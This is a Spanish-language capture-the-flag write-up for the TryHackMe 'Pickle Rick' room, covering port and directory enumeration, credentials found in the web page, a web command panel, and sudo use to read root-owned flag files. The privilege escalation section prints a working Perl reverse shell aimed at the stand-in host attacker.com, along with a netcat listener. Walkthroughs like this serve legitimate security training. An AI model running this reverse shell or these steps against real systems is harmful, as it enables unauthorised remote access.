---
title: TryHackMe Pickle Rick Writeup
published: true
---

La máquina Pickle Rick, ambientada en Rick y Morty es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos los tres ingredientes (flags) que nos hacen falta para la resolución de la misma.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.17.209 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 12:24 EDT
Initiating Connect Scan at 12:24
Scanning 10.10.17.209 [65535 ports]
Discovered open port 22/tcp on 10.10.17.209
Discovered open port 80/tcp on 10.10.17.209
Completed Connect Scan at 12:24, 14.03s elapsed (65535 total ports)
Nmap scan report for 10.10.17.209
Host is up, received user-set (0.073s latency).
Scanned at 2022-10-11 12:24:09 EDT for 14s
Not shown: 62896 closed tcp ports (conn-refused), 2637 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```

El escaneo nos reporta dos puertos abiertos, el 22 y el 80, así como el servicio que corre en cada uno de ellos.

Debido a que el puerto 80 está abierto, entramos en la web con la $IP-VICTIMA. En ella no observamos mucha información por lo que inspeccionamos el código de esta.

Tras una breve búsqueda hayamos un usuario.

```bash
Note to self, remember username!

Username: R**kR**s
```

Por otro lado, podemos usar algún buscador de directorios como pueden ser gobuster, dirsearch u otro. En mi caso utilizaré gobuster. Para ello:

```bash
gobuster dir -u http://$IP-VICTIMA -w /usr/share/wordlists/dirbuster/directoy-list1.0.txt
```

Buscamos los directorios de la $IP-VICTIMA usando el archivo de lista de palabras directory-list1.0.txt

En este punto podríamos usar cualquier lista de palabras.

```bash 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.209/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/11 12:42:09 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htpasswd.html       (Status: 403) [Size: 301]
/.hta                 (Status: 403) [Size: 291]
/.htaccess.php        (Status: 403) [Size: 300]
/.hta.php             (Status: 403) [Size: 295]
/.htaccess.html       (Status: 403) [Size: 301]
/.htaccess.txt        (Status: 403) [Size: 300]
/.hta.html            (Status: 403) [Size: 296]
/.hta.txt             (Status: 403) [Size: 295]
/a*****               (Status: 301) [Size: 313] [--> http://10.10.17.209/a*****/]
/denied.php           (Status: 302) [Size: 0] [--> /l****.php]                   
/index.html           (Status: 200) [Size: 1062]                                 
/index.html           (Status: 200) [Size: 1062]                                 
/l****.php            (Status: 200) [Size: 882]                                  
/portal.php           (Status: 302) [Size: 0] [--> /l****.php]                   
/r*****.txt           (Status: 200) [Size: 17]                                   
/r*****.txt           (Status: 200) [Size: 17]                                   
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2022/10/11 12:42:46 Finished
===============================================================
```

Tras el análisis entramos en http://$IP-VICTIMA/a----- pero no vemos nada interesante por lo que entramos en http://$IP-VICTIMA/r-----.txt y hayamos una cadena de texto que podría ser la conraseña del usuario antes hayado:

```bash
Wub*al*bb*du*dub
```

Otro de los directorios que hemos encontrado con gobuster nos proporciona una página de login. En ella probamos el usuario y contraseña que hemos adquirido y entramos!

Aparece una sección en la que podemos ajecutyar comandos. Intentamos listar el contenido con ls y aparece "Sup3rS3cretPickl3Ingred.txt". Intentamos abrirlo con cat pero no nos deja por lo que probamos otro comando como less. Encontramos así el primer ingrediente.

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Seguimos investigando mediante comandos de navegacion. Con pwd vemos donde nos encontramos y llegamos a ver que dentro del usuario rick (podemos verlo mediante ls ../../../home/rick) se haya el segundo ingrediente pero no podemos abrirlo de ningún modo.

# []($header-1)Escalada de privilegios

Ahora debemos obtener una reverse shell. Intentamos realizar una bash reverse shell pero no funciona por lo que lo intento con perl. Entramos en <a href="https://gtfobins.github.io/">gtfobins</a> para poder buscar la reverse shell con perl. 

Desde la máquina atacante nos ponemos en escucha por el puerto 444 con nc:

```bash
nc -lnvp 4444
```

Por otro lado, desde la máquina víctima introducimos la perl reverse shell:

```bash
export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Obtenemos así la reverse shell y podemos ejecutar comandos desde la máquina atacante.

Abrimos el archivo "second ingredients" y obtenemos el segundo ingrediente.

```bash
cat 'second ingredients'
```

Con sudo -l podemos observar los permisos que tiene el usuario Rick a la hora de ejecutar comandos. En este caso podemos realizar todos los comandos como sudo por lo que listamos lo que hay en el usuario root mediante:

```bash
sudo ls /root/ y vemos un archivo txt
```

Lo abrimos y obtenemos el último ingrediente!

```bash
sudo cat /root/3rd.txt
```

Muchas gracias por leer este writeup, espero que te haya gustado!
